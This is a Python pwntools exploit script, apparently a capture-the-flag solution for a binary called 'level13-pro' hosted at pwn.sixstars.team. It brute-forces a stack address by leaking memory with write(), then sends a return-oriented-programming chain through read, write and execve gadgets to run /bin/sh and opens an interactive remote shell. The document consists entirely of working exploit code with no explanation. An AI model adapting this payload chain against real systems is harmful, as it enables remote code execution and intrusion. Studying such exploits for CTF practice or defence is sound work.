from pwn import *
context.log_level="debug"
mark = "/bin/sh\x00"
ret_address = 0x080480B8
write_address= 0x080480F9
execve_address = 0x080480E6
add_esp_address = 0x0804817c
read_address = 0x080480E1
def find_stack(r,guess_address):
   
   #r.recv(0xf)
   payload = mark+'a'*(0x10-len(mark))+p32(write_address)+p32(ret_address)+p32(1)+p32(guess_address)+p32(0x800)
   #pause()
   r.sendafter("ROP like a PRO:",payload)
   r.recvuntil("Good Luck!\n")
   try:
     s = r.recv(0x800)
     if (s.find(mark)>=0):
         return guess_address+s.find(mark)
     else: 
         return -1
   except:
     return -2
stack_address = 0xff800000
flag = 0
while (1 == 1):
     r = remote("pwn.sixstars.team",22013)
     #r = process("./level13-pro.dms")
     for i in range(0,0x1000):
        guess_address = stack_address+ i*0x800
        #r = process("./level13-pro.dms")
        real_stack_address = find_stack(r,guess_address)
        if ( real_stack_address>=0):
            print hex(real_stack_address)
            flag = 1
            break 
        if (real_stack_address == -2):
            break 
     if (flag == 1): 
       break
     r.close()
        
#print r.pid
pause()

bin_address =  real_stack_address-0xc    
execve_argument = p32(execve_address)+p32(ret_address)+p32(bin_address)+chr(0x0)*8
execve_argument_address = real_stack_address+0x54

write_argument = p32(write_address)+p32(add_esp_address)+p32(0x1)+p32(0x08048190)+p32(0xb)
write_argument_address = real_stack_address+0x2c


payload = mark +'a'*(0x10-len(mark))+p32(read_address)+p32(add_esp_address)+p32(0)+p32(write_argument_address)+p32(0x80)
r.send(payload)
payload = write_argument+'a'*(0x2c-24)+execve_argument+'a'*(0x7f-len(payload))
r.sendline(payload)
r.interactive()
